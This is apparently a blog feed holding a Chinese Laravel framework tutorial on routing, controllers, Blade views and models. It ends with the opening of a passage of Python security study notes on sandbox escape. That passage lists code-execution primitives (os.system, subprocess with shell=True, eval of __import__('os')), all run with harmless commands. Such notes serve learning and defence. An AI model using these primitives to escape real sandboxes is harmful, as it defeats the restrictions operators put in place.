class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the "web" middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="各种路由"><a href="#各种路由" class="headerlink" title="各种路由"></a>各种路由</h3><ul><li>get路由<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'chenxiyuan'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello world'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>访问<code>http://127.0.0.1/laravel/public/chenxiyuan</code>,成功输出Hello world.</p><ul><li><p>post路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::post(<span class="string">'post'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'post'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>match路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::match([<span class="string">'get'</span>,<span class="string">'post'</span>],<span class="string">'match'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'match路由,匹配多种'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>any路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::any(<span class="string">'any'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'任意方法'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>重定向路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Route::redirect(<span class="string">'about'</span>,<span class="string">'chenxiyuan'</span>);</span><br><span class="line">Route::redirect(<span class="string">'about'</span>,<span class="string">'http://www.chenxiyuan.vip'</span>);</span><br></pre></td></tr></table></figure></li></ul><p>访问<a href="http://127.0.0.1/laravel/public/about跳转到http://127.0.0.1/laravel/public/chenxiyuan" target="_blank" rel="noopener">http://127.0.0.1/laravel/public/about跳转到http://127.0.0.1/laravel/public/chenxiyuan</a></p><ul><li>视图路由<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="路由传参"><a href="#路由传参" class="headerlink" title="路由传参"></a>路由传参</h3><h4 id="必须传参"><a href="#必须传参" class="headerlink" title="必须传参"></a>必须传参</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'user/&#123;id&#125;'</span>,<span class="function"><span class="keyword">function</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'id:'</span>. $id;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>访问<a href="http://127.0.0.1/laravel/public/user/1,输出:`id:1`" target="_blank" rel="noopener">http://127.0.0.1/laravel/public/user/1,输出:`id:1`</a></p><h4 id="可选传参"><a href="#可选传参" class="headerlink" title="可选传参"></a>可选传参</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'user/&#123;id?&#125;'</span>,<span class="function"><span class="keyword">function</span><span class="params">($id=null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'id:'</span>. $id;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="路由命名"><a href="#路由命名" class="headerlink" title="路由命名"></a>路由命名</h3><p>命名路由可以方便地为指定路由生成<code>URL</code>或者重定向.通过在路由定义上链式调用<code>name</code>方法指定路由名称：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'user/profile'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> route(<span class="string">'profile'</span>);</span><br><span class="line">&#125;)-&gt;name(<span class="string">'profile'</span>);</span><br></pre></td></tr></table></figure></p><p>也可以这样写:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'home/about'</span>,[<span class="string">'as'</span>=&gt;<span class="string">'about'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> route(<span class="string">'about'</span>);</span><br><span class="line">&#125;]);</span><br></pre></td></tr></table></figure></p><p>访问<a href="http://127.0.0.1/laravel/public/home/about,输出`http://127.0.0.1/laravel/public/home/about`" target="_blank" rel="noopener">http://127.0.0.1/laravel/public/home/about,输出`http://127.0.0.1/laravel/public/home/about`</a>.</p><h3 id="路由群组"><a href="#路由群组" class="headerlink" title="路由群组"></a>路由群组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'group'</span>],<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Route::match([<span class="string">'get'</span>,<span class="string">'post'</span>],<span class="string">'match'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'match路由'</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;);</span><br><span class="line">    Route::get(<span class="string">'chenxiyuan'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello world'</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>prefix指定一个前缀,地址需要加上前缀才能访问到.</p><h3 id="正则表达式约束"><a href="#正则表达式约束" class="headerlink" title="正则表达式约束"></a>正则表达式约束</h3><p>你可以使用路由实例上的<code>where</code>方法约束路由参数的格式.where方法接受参数名称和定义参数应如何约束的正则表达式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'user/&#123;name&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;)-&gt;where(<span class="string">'name'</span>, <span class="string">'[A-Za-z]+'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'user/&#123;id&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;)-&gt;where(<span class="string">'id'</span>, <span class="string">'[0-9]+'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'user/&#123;id&#125;/&#123;name&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($id, $name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;)-&gt;where([<span class="string">'id'</span> =&gt; <span class="string">'[0-9]+'</span>, <span class="string">'name'</span> =&gt; <span class="string">'[a-z]+'</span>]);</span><br></pre></td></tr></table></figure></p><h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><p>真正的项目,并不是把函数方法直接写在路由里的,而是在控制器中定义,再和路由进行关联.控制器目录:<code>app-&gt;Http-&gt;Controllers</code><br>在Controllers文件夹下新建一个类<code>MemberController.php</code>与<code>Controller.php</code>同目录:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemberController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">info</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'memberinfo:id='</span>.$id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在路由中注册:<code>Route::get(&#39;memberinfo/{id}&#39;,&#39;MemberController@info&#39;);</code><br>访问<a href="http://127.0.0.1/laravel/public/memberinfo/100,成功输出:memberinfo:id=100" target="_blank" rel="noopener">http://127.0.0.1/laravel/public/memberinfo/100,成功输出:memberinfo:id=100</a></p><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p>为方便运行一下public文件夹cmd<code>php -S 0.0.0.0:9999</code><br>视图目录:<code>resources-&gt;views</code>.<br>新建一个<code>greeting.blade.php</code>模板<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello, &#123;&#123; $name &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>新建一个<code>Greeting.php</code>控制器<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeting</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'greeting'</span>,[<span class="string">'name'</span>=&gt;<span class="string">'chenxiyuan'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加到路由:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'greet'</span>,<span class="string">'Greeting@greet'</span>);</span><br></pre></td></tr></table></figure></p><p>访问<a href="http://127.0.0.1:9999/greet" target="_blank" rel="noopener">http://127.0.0.1:9999/greet</a><br><img src="http://i1.fuimg.com/665720/1e513971af34536b.png" alt="Markdown"></p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型文件放在app文件夹下,新建一个<code>Greet.php</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greet</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getblog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'chenxiyuan.vip'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>改写Greeting控制器:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Greet</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Greeting</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Greet::getblog();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>路由不变,访问<a href="http://127.0.0.1:9999/greet,成功输出:chenxiyuan.vip" target="_blank" rel="noopener">http://127.0.0.1:9999/greet,成功输出:chenxiyuan.vip</a></p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>Blade 是 Laravel 提供的一个简单而又强大的模板引擎。和其他流行的 PHP 模板引擎不同，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何负担。Blade 视图文件使用 .blade.php 作为文件扩展名，被存放在 resources/views 目录。</p><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><h4 id="定义布局"><a href="#定义布局" class="headerlink" title="定义布局"></a>定义布局</h4><p>主页面:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件保存于 resources/views/layouts/app.blade.php --&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;应用程序名称 - @<span class="keyword">yield</span>(<span class="string">'title'</span>)&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        @section(<span class="string">'sidebar'</span>)</span><br><span class="line">            这是主布局的侧边栏。</span><br><span class="line">        @show</span><br><span class="line"></span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            @<span class="keyword">yield</span>(<span class="string">'content'</span>)</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><code>@section</code>命令定义了视图的一部分内容,而<code>@yield</code>指令是用来显示指定部分的内容.</p><h4 id="继承布局"><a href="#继承布局" class="headerlink" title="继承布局"></a>继承布局</h4><p>当定义子视图时，你可以使用Blade提供的<code>@extends</code>命令来为子视图指定应该 「继承」 的布局.继承Blade布局的视图可使用 @section 命令将内容注入于布局的<code>@section</code>中.而主布局中使用<code>@yield</code>的地方会显示这些子视图中的<code>@section</code>间的内容:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件保存于 resources/views/layouts/child.blade.php --&gt;</span><br><span class="line"></span><br><span class="line">@extends(<span class="string">'layouts.app'</span>)</span><br><span class="line"></span><br><span class="line">@section(<span class="string">'title'</span>, <span class="string">'Page Title'</span>)</span><br><span class="line"></span><br><span class="line">@section(<span class="string">'sidebar'</span>)</span><br><span class="line">    @<span class="keyword">parent</span></span><br><span class="line"></span><br><span class="line">    &lt;p&gt;这将追加到主布局的侧边栏。&lt;/p&gt;</span><br><span class="line">@endsection</span><br><span class="line"></span><br><span class="line">@section(<span class="string">'content'</span>)</span><br><span class="line">    &lt;p&gt;这是主体内容。&lt;/p&gt;</span><br><span class="line">@endsection</span><br></pre></td></tr></table></figure></p><p>在上面的例子里,<code>@section</code>中的sidebar使用<code>@parent</code>命令在主布局的<code>@section(&#39;sidebar&#39;)</code>中增加内容（不是覆盖）.渲染视图时,<code>@parent</code>指令会被替换为主布局中<code>@section(&#39;sidebar&#39;)</code>间的内容.</p><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><h4 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h4><p>你可以使用<code>@if</code>、<code>@elseif</code>、<code>@else</code> 及 <code>@endif</code> 指令来构建 if 表达式。这些命令的功能等同于 PHP 中的语法:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">if</span> (count($records) === <span class="number">1</span>)</span><br><span class="line">    我有一条记录！</span><br><span class="line">@<span class="keyword">elseif</span> (count($records) &gt; <span class="number">1</span>)</span><br><span class="line">    我有多条记录！</span><br><span class="line">@<span class="keyword">else</span></span><br><span class="line">    我没有任何记录！</span><br><span class="line">@<span class="keyword">endif</span></span><br></pre></td></tr></table></figure></p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++)</span><br><span class="line">    目前的值为 &#123;&#123; $i &#125;&#125;</span><br><span class="line">@<span class="keyword">endfor</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user)</span><br><span class="line">    &lt;p&gt;此用户为 &#123;&#123; $user-&gt;id &#125;&#125;&lt;/p&gt;</span><br><span class="line">@<span class="keyword">endforeach</span></span><br><span class="line"></span><br><span class="line">@forelse ($users <span class="keyword">as</span> $user)</span><br><span class="line">    &lt;li&gt;&#123;&#123; $user-&gt;name &#125;&#125;&lt;/li&gt;</span><br><span class="line">@<span class="keyword">empty</span></span><br><span class="line">    &lt;p&gt;没有用户&lt;/p&gt;</span><br><span class="line">@endforelse</span><br><span class="line"></span><br><span class="line">@<span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &lt;p&gt;死循环了。&lt;/p&gt;</span><br><span class="line">@<span class="keyword">endwhile</span></span><br></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>Blade 也能在视图中定义注释。然而，跟 HTML 的注释不同的，Blade 注释不会被包含在应用程序返回的 HTML 内：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;-- 此注释将不会出现在渲染后的 HTML --&#125;&#125;</span><br></pre></td></tr></table></figure></p><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>在某些情况下，将 PHP 代码嵌入到视图中很有用。你可以使用 Blade 的 @php 指令在模板中执行一段纯 PHP 代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@php</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">@endphp</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;composer&quot;&gt;&lt;a href=&quot;#composer&quot; class=&quot;headerlink&quot; title=&quot;composer&quot;&gt;&lt;/a&gt;composer&lt;/h2&gt;&lt;p&gt;先切换镜像源吧,不然下不下来laravel框架.&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;composer config -g repo.packagist composer https://packagist.phpcomposer.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后进入网站根目录安装laravel框架&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;composer create-project laravel/laravel laravel v5.8.17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里因为我安装的是phpstudy,所以直接访问&lt;code&gt;http://127.0.0.1/laravel/public/&lt;/code&gt;即可.&lt;br&gt;也可以cmd进入到public目录,&lt;code&gt;php -S 0.0.0.0:9999&lt;/code&gt;,然后访问&lt;code&gt;127.0.0.1:9999&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="php,web" scheme="http://chenxiyuan.vip/tags/php-web/"/>
    
  </entry>
  
  <entry>
    <title>python安全学习笔记</title>
    <link href="http://chenxiyuan.vip/2019/07/24/python%E5%AE%89%E5%85%A8/"/>
    <id>http://chenxiyuan.vip/2019/07/24/python安全/</id>
    <published>2019-07-24T03:59:25.000Z</published>
    <updated>2019-07-24T16:16:58.129Z</updated>
    
    <content type="html"><![CDATA[<p>也学了挺久的python了,是时候对关于python安全的一些问题做个研究并记录下来了.参考这里<a href="https://github.com/bit4woo/python_sec" target="_blank" rel="noopener">python_Sec</a>.<br><a id="more"></a></p><h2 id="Python-Sandbox-Bypass"><a href="#Python-Sandbox-Bypass" class="headerlink" title="Python Sandbox Bypass"></a>Python Sandbox Bypass</h2><p>沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程.</p><h3 id="任意代码或者命令执行"><a href="#任意代码或者命令执行" class="headerlink" title="任意代码或者命令执行"></a>任意代码或者命令执行</h3><p>一些常用的的函数方法:</p><h4 id="os"><a href="#os" class="headerlink" title="os"></a>os</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'ls'</span>)</span><br><span class="line">os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure><h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure><h4 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">'ifconfig'</span>,shell=<span class="keyword">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">'ls'</span>, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#python3多了一个run方法</span></span><br><span class="line">subprocess.run(<span class="string">'ifconfig'</span>,shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>如果shell=True的话,curl命令是被Bash(Sh)启动.所以支持shell语法, 如果shell=False的话.启动的是可执行程序本身,后面的参数不再支持shell语法.如果shell=False,你需要用数组表示.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">subprocess.call(<span class="string">'curl www.baidu.com'</span>,shell=<span class="keyword">False</span>)<span class="comment">#这样是会报错的</span></span><br><span class="line">subprocess.call(<span class="string">'curl www.baidu.com'</span>,shell=<span class="keyword">True</span>)<span class="comment">#改成True成功</span></span><br><span class="line">subprocess.call([<span class="string">'curl'</span>,<span class="string">'www.baidu.com'</span>],shell=<span class="keyword">False</span>)<span class="comment">#用数组表示,第一个是命令,之后都是参数</span></span><br><span class="line"><span class="comment">#再看一个例子</span></span><br><span class="line">subprocess.call(<span class="string">'cat 1.txt'</span>,shell=<span class="keyword">True</span>)<span class="comment">#正确</span></span><br><span class="line">subprocess.call(<span class="string">'cat 1.txt'</span>,shell=<span class="keyword">False</span>)<span class="comment">#报错</span></span><br><span class="line">subprocess.call([<span class="string">'cat'</span>,<span class="string">'1.txt'</span>],shell=<span class="keyword">False</span>)<span class="comment">#成功</span></span><br></pre></td></tr></table></figure></p><h4 id="exec-eval-execfile"><a href="#exec-eval-execfile" class="headerlink" title="exec(),eval(),execfile()"></a>exec(),eval(),execfile()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("ls")'</span>)</span><br><span 